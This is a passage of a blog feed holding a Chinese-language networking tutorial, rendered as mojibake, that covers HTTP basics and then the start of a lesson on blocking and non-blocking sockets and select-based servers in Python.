class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ä½¿ç”¨socketå‘é€åŸå§‹HTTPè¯·æ±‚</span><br><span class="hljs-comment"># 1. è¿æ¥åˆ°www.baidu.com:80</span><br><span class="hljs-comment"># 2. å‘é€GETè¯·æ±‚</span><br><span class="hljs-comment"># 3. è§£æå“åº”</span><br><span class="hljs-comment"># 4. æ‰“å°çŠ¶æ€ç å’Œå¤´éƒ¨</span><br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 2ï¼šå®ç°HTTPå®¢æˆ·ç«¯"><a href="#ç»ƒä¹ 2ï¼šå®ç°HTTPå®¢æˆ·ç«¯" class="headerlink" title="ç»ƒä¹ 2ï¼šå®ç°HTTPå®¢æˆ·ç«¯"></a>ç»ƒä¹ 2ï¼šå®ç°HTTPå®¢æˆ·ç«¯</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å®ç°ä¸€ä¸ªç®€å•çš„HTTPå®¢æˆ·ç«¯</span><br><span class="hljs-comment"># æ”¯æŒï¼š</span><br><span class="hljs-comment"># 1. GETè¯·æ±‚</span><br><span class="hljs-comment"># 2. POSTè¯·æ±‚ï¼ˆJSONï¼‰</span><br><span class="hljs-comment"># 3. è‡ªåŠ¨å¤„ç†é‡å®šå‘</span><br><span class="hljs-comment"># 4. Cookieç®¡ç†</span><br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 3ï¼šåˆ†æHTTPæµé‡"><a href="#ç»ƒä¹ 3ï¼šåˆ†æHTTPæµé‡" class="headerlink" title="ç»ƒä¹ 3ï¼šåˆ†æHTTPæµé‡"></a>ç»ƒä¹ 3ï¼šåˆ†æHTTPæµé‡</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ä½¿ç”¨Wiresharkæˆ–tcpdump</span><br><span class="hljs-comment"># 1. æ•è·HTTPæµé‡</span><br><span class="hljs-comment"># 2. åˆ†æè¯·æ±‚å’Œå“åº”</span><br><span class="hljs-comment"># 3. è¯†åˆ«çŠ¶æ€ç å’Œå¤´éƒ¨</span><br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 4ï¼šæ‰©å±•HTTPæœåŠ¡å™¨"><a href="#ç»ƒä¹ 4ï¼šæ‰©å±•HTTPæœåŠ¡å™¨" class="headerlink" title="ç»ƒä¹ 4ï¼šæ‰©å±•HTTPæœåŠ¡å™¨"></a>ç»ƒä¹ 4ï¼šæ‰©å±•HTTPæœåŠ¡å™¨</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ä¸ºHTTPæœåŠ¡å™¨æ·»åŠ åŠŸèƒ½ï¼š</span><br><span class="hljs-comment"># 1. æ”¯æŒPUT/DELETEæ–¹æ³•</span><br><span class="hljs-comment"># 2. Sessionç®¡ç†</span><br><span class="hljs-comment"># 3. æ–‡ä»¶ä¸Šä¼ </span><br><span class="hljs-comment"># 4. è®¿é—®æ§åˆ¶ï¼ˆBasic Authï¼‰</span><br></code></pre></td></tr></table></figure><hr><h2 id="9-å¸¸è§é—®é¢˜"><a href="#9-å¸¸è§é—®é¢˜" class="headerlink" title="9. å¸¸è§é—®é¢˜"></a>9. å¸¸è§é—®é¢˜</h2><p><strong>Q1ï¼šGETå’ŒPOSTçš„æœ¬è´¨åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>è¯­ä¹‰ï¼šGETç”¨äºè·å–ï¼ŒPOSTç”¨äºæäº¤</li><li>å‚æ•°ï¼šGETåœ¨URLï¼ŒPOSTåœ¨è¯·æ±‚ä½“</li><li>å¹‚ç­‰æ€§ï¼šGETå¹‚ç­‰ï¼ŒPOSTä¸å¹‚ç­‰</li><li>ç¼“å­˜ï¼šGETå¯ç¼“å­˜ï¼ŒPOSTä¸å¯</li><li>å®‰å…¨æ€§ï¼šGETå‚æ•°å¯è§ï¼ŒPOSTç›¸å¯¹éšè—</li></ul><p><strong>Q2ï¼šä¸ºä»€ä¹ˆæœ‰çŠ¶æ€ç 304ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>èŠ‚çœå¸¦å®½</li><li>åˆ©ç”¨æµè§ˆå™¨ç¼“å­˜</li><li>æœåŠ¡å™¨è¿”å›â€èµ„æºæœªä¿®æ”¹â€</li><li>æµè§ˆå™¨ä½¿ç”¨æœ¬åœ°ç¼“å­˜</li></ul><p><strong>Q3ï¼šCookieå’ŒSessionå“ªä¸ªæ›´å®‰å…¨ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>Sessionæ›´å®‰å…¨ï¼ˆæ•°æ®åœ¨æœåŠ¡å™¨ï¼‰</li><li>Cookieæ˜“è¢«çªƒå–å’Œç¯¡æ”¹</li><li>å®é™…ä½¿ç”¨ï¼šCookieå­˜Session ID</li></ul><p><strong>Q4ï¼šHTTP&#x2F;2æ¯”HTTP&#x2F;1.1å¿«å¤šå°‘ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>ç†è®ºä¸Šï¼š30%-50%</li><li>å®é™…ï¼šå–å†³äºç½‘ç»œå’Œèµ„æºæ•°é‡</li><li>èµ„æºè¶Šå¤šï¼Œä¼˜åŠ¿è¶Šæ˜æ˜¾</li></ul><p><strong>Q5ï¼šä»€ä¹ˆæ—¶å€™ç”¨POSTï¼Œä»€ä¹ˆæ—¶å€™ç”¨PUTï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>POSTï¼šåˆ›å»ºæ–°èµ„æºï¼ˆIDç”±æœåŠ¡å™¨ç”Ÿæˆï¼‰</li><li>PUTï¼šæ›´æ–°å·²å­˜åœ¨èµ„æºï¼ˆIDå·²çŸ¥ï¼‰</li><li>POSTéå¹‚ç­‰ï¼ŒPUTå¹‚ç­‰</li></ul><hr><h2 id="10-æ€»ç»“"><a href="#10-æ€»ç»“" class="headerlink" title="10. æ€»ç»“"></a>10. æ€»ç»“</h2><p>ä»Šå¤©æˆ‘ä»¬å­¦ä¹ äº†ï¼š</p><h3 id="æ ¸å¿ƒçŸ¥è¯†ç‚¹"><a href="#æ ¸å¿ƒçŸ¥è¯†ç‚¹" class="headerlink" title="æ ¸å¿ƒçŸ¥è¯†ç‚¹"></a>æ ¸å¿ƒçŸ¥è¯†ç‚¹</h3><ol><li><p><strong>HTTPåŸºç¡€</strong>ï¼š</p><ul><li>åº”ç”¨å±‚åè®®</li><li>æ— çŠ¶æ€ã€æ˜æ–‡ä¼ è¾“</li><li>è¯·æ±‚-å“åº”æ¨¡å¼</li></ul></li><li><p><strong>è¯·æ±‚æ ¼å¼</strong>ï¼š</p><ul><li>è¯·æ±‚è¡Œï¼ˆæ–¹æ³• URI ç‰ˆæœ¬ï¼‰</li><li>è¯·æ±‚å¤´</li><li>ç©ºè¡Œ</li><li>è¯·æ±‚ä½“ï¼ˆå¯é€‰ï¼‰</li></ul></li><li><p><strong>å“åº”æ ¼å¼</strong>ï¼š</p><ul><li>çŠ¶æ€è¡Œï¼ˆç‰ˆæœ¬ çŠ¶æ€ç  æè¿°ï¼‰</li><li>å“åº”å¤´</li><li>ç©ºè¡Œ</li><li>å“åº”ä½“</li></ul></li><li><p><strong>HTTPæ–¹æ³•</strong>ï¼š</p><ul><li>GETï¼šæŸ¥è¯¢</li><li>POSTï¼šåˆ›å»º</li><li>PUTï¼šæ›´æ–°</li><li>DELETEï¼šåˆ é™¤</li></ul></li><li><p><strong>çŠ¶æ€ç </strong>ï¼š</p><ul><li>2xxï¼šæˆåŠŸ</li><li>3xxï¼šé‡å®šå‘</li><li>4xxï¼šå®¢æˆ·ç«¯é”™è¯¯</li><li>5xxï¼šæœåŠ¡å™¨é”™è¯¯</li></ul></li><li><p><strong>Cookie&#x2F;Session</strong>ï¼š</p><ul><li>Cookieï¼šå®¢æˆ·ç«¯å­˜å‚¨</li><li>Sessionï¼šæœåŠ¡å™¨å­˜å‚¨</li><li>é…åˆä½¿ç”¨</li></ul></li><li><p><strong>ç‰ˆæœ¬æ¼”è¿›</strong>ï¼š</p><ul><li>HTTP&#x2F;1.1ï¼šæŒä¹…è¿æ¥</li><li>HTTP&#x2F;2ï¼šå¤šè·¯å¤ç”¨</li><li>HTTP&#x2F;3ï¼šQUIC</li></ul></li></ol><h3 id="é‡ç‚¹å›é¡¾"><a href="#é‡ç‚¹å›é¡¾" class="headerlink" title="é‡ç‚¹å›é¡¾"></a>é‡ç‚¹å›é¡¾</h3><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">HTTPè¯·æ±‚ </span>=<span class="hljs-string"> è¯·æ±‚è¡Œ + è¯·æ±‚å¤´ + ç©ºè¡Œ + è¯·æ±‚ä½“</span><br><span class="hljs-string">HTTPå“åº” = çŠ¶æ€è¡Œ + å“åº”å¤´ + ç©ºè¡Œ + å“åº”ä½“</span><br><span class="hljs-string"></span><br><span class="hljs-string">å¸¸ç”¨çŠ¶æ€ç ï¼š</span><br><span class="hljs-string">200 OK</span><br><span class="hljs-string">301 æ°¸ä¹…é‡å®šå‘</span><br><span class="hljs-string">302 ä¸´æ—¶é‡å®šå‘</span><br><span class="hljs-string">304 æœªä¿®æ”¹</span><br><span class="hljs-string">400 è¯·æ±‚é”™è¯¯</span><br><span class="hljs-string">401 æœªè®¤è¯</span><br><span class="hljs-string">403 ç¦æ­¢</span><br><span class="hljs-string">404 æœªæ‰¾åˆ°</span><br><span class="hljs-string">500 æœåŠ¡å™¨é”™è¯¯</span><br><span class="hljs-string"></span><br><span class="hljs-string">HTTP/2æ ¸å¿ƒï¼š</span><br><span class="hljs-string">å¤šè·¯å¤ç”¨ + å¤´éƒ¨å‹ç¼© + äºŒè¿›åˆ¶åè®®</span><br></code></pre></td></tr></table></figure><h3 id="æ˜å¤©é¢„å‘Š"><a href="#æ˜å¤©é¢„å‘Š" class="headerlink" title="æ˜å¤©é¢„å‘Š"></a>æ˜å¤©é¢„å‘Š</h3><p><strong>ç¬¬20å¤©ï¼šHTTPSå’Œå®‰å…¨</strong></p><p>å†…å®¹é¢„è§ˆï¼š</p><ul><li>TLS&#x2F;SSLåè®®</li><li>æ•°å­—è¯ä¹¦</li><li>å¯¹ç§°åŠ å¯†å’Œéå¯¹ç§°åŠ å¯†</li><li>HTTPSæ¡æ‰‹è¿‡ç¨‹</li><li>è¯ä¹¦éªŒè¯</li><li>å¸¸è§æ”»å‡»å’Œé˜²å¾¡</li></ul><hr><p><strong>ç»§ç»­åŠ æ²¹ï¼</strong> ğŸš€</p><p>ä»Šå¤©æˆ‘ä»¬å­¦ä¹ äº†HTTPåè®®çš„åŸºç¡€çŸ¥è¯†ï¼Œè¿™æ˜¯Webå¼€å‘çš„æ ¸å¿ƒã€‚ç†è§£HTTPåè®®å¯¹äºå¼€å‘Webåº”ç”¨ã€è°ƒè¯•ç½‘ç»œé—®é¢˜éƒ½è‡³å…³é‡è¦ã€‚æ˜å¤©æˆ‘ä»¬å°†å­¦ä¹ HTTPSï¼Œäº†è§£å¦‚ä½•ä¿æŠ¤HTTPé€šä¿¡çš„å®‰å…¨ï¼</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>18å¤©ï¼šSocketç¼–ç¨‹è¿›é˜¶</title>
    <link href="/2025/11/10/18%E5%A4%A9%EF%BC%9ASocket%E7%BC%96%E7%A8%8B%E8%BF%9B%E9%98%B6/"/>
    <url>/2025/11/10/18%E5%A4%A9%EF%BC%9ASocket%E7%BC%96%E7%A8%8B%E8%BF%9B%E9%98%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬18å¤©ï¼šSocketç¼–ç¨‹è¿›é˜¶"><a href="#ç¬¬18å¤©ï¼šSocketç¼–ç¨‹è¿›é˜¶" class="headerlink" title="ç¬¬18å¤©ï¼šSocketç¼–ç¨‹è¿›é˜¶"></a>ç¬¬18å¤©ï¼šSocketç¼–ç¨‹è¿›é˜¶</h1><h2 id="ä»Šæ—¥ç›®æ ‡"><a href="#ä»Šæ—¥ç›®æ ‡" class="headerlink" title="ä»Šæ—¥ç›®æ ‡"></a>ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£é˜»å¡å’Œéé˜»å¡Socket</li><li>æŒæ¡IOå¤šè·¯å¤ç”¨æŠ€æœ¯ï¼ˆselect&#x2F;poll&#x2F;epollï¼‰</li><li>å­¦ä¹ Socketé€‰é¡¹é…ç½®</li><li>äº†è§£é«˜æ€§èƒ½æœåŠ¡å™¨è®¾è®¡æ¨¡å¼</li><li>å®ç°å¤šå®¢æˆ·ç«¯å¹¶å‘æœåŠ¡å™¨</li><li>æ„å»ºå®æˆ˜é¡¹ç›®ï¼šå¤šäººèŠå¤©å®¤</li></ul><hr><h2 id="1-é˜»å¡ä¸éé˜»å¡Socket"><a href="#1-é˜»å¡ä¸éé˜»å¡Socket" class="headerlink" title="1. é˜»å¡ä¸éé˜»å¡Socket"></a>1. é˜»å¡ä¸éé˜»å¡Socket</h2><h3 id="1-1-ä»€ä¹ˆæ˜¯é˜»å¡ï¼Ÿ"><a href="#1-1-ä»€ä¹ˆæ˜¯é˜»å¡ï¼Ÿ" class="headerlink" title="1.1 ä»€ä¹ˆæ˜¯é˜»å¡ï¼Ÿ"></a>1.1 ä»€ä¹ˆæ˜¯é˜»å¡ï¼Ÿ</h3><p><strong>é˜»å¡ï¼ˆBlockingï¼‰</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">ç”Ÿæ´»ç±»æ¯”ï¼š<br>ä½ å»é“¶è¡Œå–é’±ï¼ˆé˜»å¡æ¨¡å¼ï¼‰ï¼š<br><span class="hljs-number">1.</span> æ’é˜Ÿç­‰å¾…<br><span class="hljs-number">2.</span> å«åˆ°ä½ çš„å·ä¹‹å‰ï¼Œä½ åªèƒ½ç­‰å¾…<br><span class="hljs-number">3.</span> ä»€ä¹ˆä¹Ÿåšä¸äº†<br><span class="hljs-number">4.</span> å«åˆ°å·äº†æ‰èƒ½åŠç†ä¸šåŠ¡<br><br>é˜»å¡Socketï¼š<br>sock.recv(<span class="hljs-number">1024</span>)<br>â†“<br>å¦‚æœæ²¡æœ‰æ•°æ®ï¼Œå°±ä¸€ç›´ç­‰å¾…<br>ä»€ä¹ˆä¹Ÿåšä¸äº†<br>ç›´åˆ°æœ‰æ•°æ®åˆ°è¾¾<br></code></pre></td></tr></table></figure><p><strong>é˜»å¡Socketç¤ºä¾‹</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-comment"># é»˜è®¤æ˜¯é˜»å¡æ¨¡å¼</span><br>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>sock.connect((<span class="hljs-string">&#x27;www.baidu.com&#x27;</span>, <span class="hljs-number">80</span>))<br><br><span class="hljs-comment"># å‘é€è¯·æ±‚</span><br>sock.send(<span class="hljs-string">b&#x27;GET / HTTP/1.1\r\nHost: www.baidu.com\r\n\r\n&#x27;</span>)<br><br><span class="hljs-comment"># é˜»å¡åœ¨è¿™é‡Œï¼Œç›´åˆ°æ”¶åˆ°æ•°æ®</span><br>data = sock.recv(<span class="hljs-number">1024</span>)  <span class="hljs-comment"># â¸ï¸ é˜»å¡ç­‰å¾…</span><br><span class="hljs-built_in">print</span>(data)<br><br>sock.close()<br></code></pre></td></tr></table></figure><p><strong>é˜»å¡çš„é—®é¢˜</strong>ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css">å•çº¿ç¨‹æœåŠ¡å™¨ï¼š<br><br>while True:<br>    client_sock, addr = server_sock.<span class="hljs-built_in">accept</span>()  # é˜»å¡<span class="hljs-number">1</span><br>    data = client_sock.<span class="hljs-built_in">recv</span>(<span class="hljs-number">1024</span>)             # é˜»å¡<span class="hljs-number">2</span><br>    client_sock.<span class="hljs-built_in">send</span>(response)<br>    client_sock.<span class="hljs-built_in">close</span>()<br><br>é—®é¢˜ï¼š<br>- <span class="hljs-built_in">accept</span>()é˜»å¡ â†’ åªèƒ½ç­‰å¾…ä¸€ä¸ªå®¢æˆ·ç«¯<br>- <span class="hljs-built_in">recv</span>()é˜»å¡ â†’ å¤„ç†ä¸€ä¸ªå®¢æˆ·ç«¯æ—¶ï¼Œå…¶ä»–å®¢æˆ·ç«¯æ— æ³•è¿æ¥<br>- æ— æ³•åŒæ—¶æœåŠ¡å¤šä¸ªå®¢æˆ·ç«¯ âŒ<br></code></pre></td></tr></table></figure><h3 id="1-2-éé˜»å¡Socket"><a href="#1-2-éé˜»å¡Socket" class="headerlink" title="1.2 éé˜»å¡Socket"></a>1.2 éé˜»å¡Socket</h3><p><strong>éé˜»å¡ï¼ˆNon-blockingï¼‰</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">ç”Ÿæ´»ç±»æ¯”ï¼š<br>ä½ å»é“¶è¡Œå–é’±ï¼ˆéé˜»å¡æ¨¡å¼ï¼‰ï¼š<br><span class="hljs-number">1.</span> å–å·<br><span class="hljs-number">2.</span> æ²¡å«åˆ°å·ï¼Œå»æ—è¾¹ç©æ‰‹æœº<br><span class="hljs-number">3.</span> æ¯éš”å‡ åˆ†é’Ÿçœ‹ä¸€çœ¼å«å·å±å¹•<br><span class="hljs-number">4.</span> å«åˆ°å·äº†å†å»åŠç†<br><br>éé˜»å¡Socketï¼š<br>sock.setblocking(<span class="hljs-literal">False</span>)<br><span class="hljs-keyword">try</span>:<br>    data = sock.recv(<span class="hljs-number">1024</span>)<br><span class="hljs-keyword">except</span> BlockingIOError:<br>    <span class="hljs-comment"># æ²¡æœ‰æ•°æ®ï¼Œç«‹å³è¿”å›</span><br>    <span class="hljs-comment"># å¯ä»¥åšå…¶ä»–äº‹æƒ…</span><br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p><strong>éé˜»å¡Socketç¤ºä¾‹</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> errno<br><br>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><br><span class="hljs-comment"># è®¾ç½®ä¸ºéé˜»å¡</span><br>sock.setblocking(<span class="hljs-literal">False</span>)<br><br><span class="hljs-keyword">try</span>:<br>    sock.connect((<span class="hljs-string">&#x27;www.baidu.com&#x27;</span>, <span class="hljs-number">80</span>))<br><span class="hljs-keyword">except</span> BlockingIOError:<br>    <span class="hljs-comment"># è¿æ¥æ­£åœ¨è¿›è¡Œä¸­</span><br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-comment"># å‘é€æ•°æ®</span><br><span class="hljs-keyword">try</span>:<br>    sock.send(<span class="hljs-string">b&#x27;GET / HTTP/1.1\r\nHost: www.baidu.com\r\n\r\n&#x27;</span>)<br><span class="hljs-keyword">except</span> BlockingIOError:<br>    <span class="hljs-comment"># ç¼“å†²åŒºæ»¡ï¼Œæš‚æ—¶æ— æ³•å‘é€</span><br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-comment"># æ¥æ”¶æ•°æ®</span><br><span class="hljs-keyword">try</span>:<br>    data = sock.recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-built_in">print</span>(data)<br><span class="hljs-keyword">except</span> BlockingIOError:<br>    <span class="hljs-comment"># æ²¡æœ‰æ•°æ®å¯è¯»</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æš‚æ—¶æ²¡æœ‰æ•°æ®&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>éé˜»å¡çš„é—®é¢˜</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># éœ€è¦ä¸æ–­è½®è¯¢</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        data = sock.recv(<span class="hljs-number">1024</span>)<br>        <span class="hljs-keyword">if</span> data:<br>            process(data)<br>    <span class="hljs-keyword">except</span> BlockingIOError:<br>        <span class="hljs-keyword">pass</span>  <span class="hljs-comment"># ç»§ç»­è½®è¯¢</span><br><br>    <span class="hljs-comment"># CPU 100%ï¼ä¸æ–­å¾ªç¯æ£€æŸ¥ âŒ</span><br></code></pre></td></tr></table></figure><hr><h2 id="2-IOå¤šè·¯å¤ç”¨"><a href="#2-IOå¤šè·¯å¤ç”¨" class="headerlink" title="2. IOå¤šè·¯å¤ç”¨"></a>2. IOå¤šè·¯å¤ç”¨</h2><h3 id="2-1-ä»€ä¹ˆæ˜¯IOå¤šè·¯å¤ç”¨ï¼Ÿ"><a href="#2-1-ä»€ä¹ˆæ˜¯IOå¤šè·¯å¤ç”¨ï¼Ÿ" class="headerlink" title="2.1 ä»€ä¹ˆæ˜¯IOå¤šè·¯å¤ç”¨ï¼Ÿ"></a>2.1 ä»€ä¹ˆæ˜¯IOå¤šè·¯å¤ç”¨ï¼Ÿ</h3><p><strong>IOå¤šè·¯å¤ç”¨ï¼ˆI&#x2F;O Multiplexingï¼‰</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">é—®é¢˜ï¼š<br>å¦‚ä½•åŒæ—¶ç›‘å¬å¤šä¸ªSocketï¼Œè€Œä¸éœ€è¦ä¸ºæ¯ä¸ªSocketåˆ›å»ºçº¿ç¨‹ï¼Ÿ<br><br>è§£å†³æ–¹æ¡ˆï¼š<br>IOå¤šè·¯å¤ç”¨ = ä¸€ä¸ªçº¿ç¨‹ç›‘å¬å¤šä¸ªSocket<br><br>ç”Ÿæ´»ç±»æ¯”ï¼š<br>ä½ æ˜¯ä¸€ä¸ªè€å¸ˆï¼Œè¦ç…§é¡¾30ä¸ªå­¦ç”Ÿï¼š<br><br>æ–¹æ¡ˆ1ï¼šé˜»å¡ï¼ˆä¸ç°å®ï¼‰<br><span class="hljs-bullet">- </span>ç›¯ç€ç¬¬1ä¸ªå­¦ç”Ÿï¼Œç›´åˆ°ä»–æé—®<br><span class="hljs-bullet">- </span>å…¶ä»–29ä¸ªå­¦ç”Ÿè¢«å¿½ç•¥<br><br>æ–¹æ¡ˆ2ï¼šè½®è¯¢ï¼ˆCPUæµªè´¹ï¼‰<br><span class="hljs-bullet">- </span>ä¸åœåœ°é—®æ¯ä¸ªå­¦ç”Ÿï¼š&quot;æœ‰é—®é¢˜å—ï¼Ÿ&quot;<br><span class="hljs-bullet">- </span>å¤§éƒ¨åˆ†æ—¶é—´éƒ½åœ¨é—®ï¼Œå¾ˆç´¯<br><br>æ–¹æ¡ˆ3ï¼šIOå¤šè·¯å¤ç”¨ï¼ˆæœ€ä¼˜ï¼‰<br><span class="hljs-bullet">- </span>ååœ¨è®²å°ä¸Š<br><span class="hljs-bullet">- </span>è°ä¸¾æ‰‹ï¼ˆæœ‰æ•°æ®ï¼‰ï¼Œå°±å¤„ç†è°<br><span class="hljs-bullet">- </span>æ²¡äººä¸¾æ‰‹ï¼Œå°±ä¼‘æ¯ï¼ˆé˜»å¡åœ¨selectä¸Šï¼‰<br></code></pre></td></tr></table></figure><h3 id="2-2-select"><a href="#2-2-select" class="headerlink" title="2.2 select"></a>2.2 select</h3><p><strong>selectåŸç†</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> select<br><br><span class="hljs-comment"># è¦ç›‘å¬çš„socketåˆ—è¡¨</span><br>read_list = [sock1, sock2, sock3]<br>write_list = []<br>error_list = []<br><br><span class="hljs-comment"># é˜»å¡ç­‰å¾…ï¼Œç›´åˆ°æœ‰socketå°±ç»ª</span><br>readable, writable, exceptional = select.select(<br>    read_list,<br>    write_list,<br>    error_list,<br>    timeout  <span class="hljs-comment"># è¶…æ—¶æ—¶é—´ï¼ŒNoneè¡¨ç¤ºä¸€ç›´é˜»å¡</span><br>)<br><br><span class="hljs-comment"># å¤„ç†å°±ç»ªçš„socket</span><br><span class="hljs-keyword">for</span> sock <span class="hljs-keyword">in</span> readable:<br>    data = sock.recv(<span class="hljs-number">1024</span>)<br>    process(data)<br></code></pre></td></tr></table></figure><p><strong>selectæœåŠ¡å™¨ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> select<br><span class="hljs-keyword">import</span> socket<br><br>server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>server.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">8888</span>))<br>server.listen(<span class="hljs-number">5</span>)<br>server.setblocking(<span 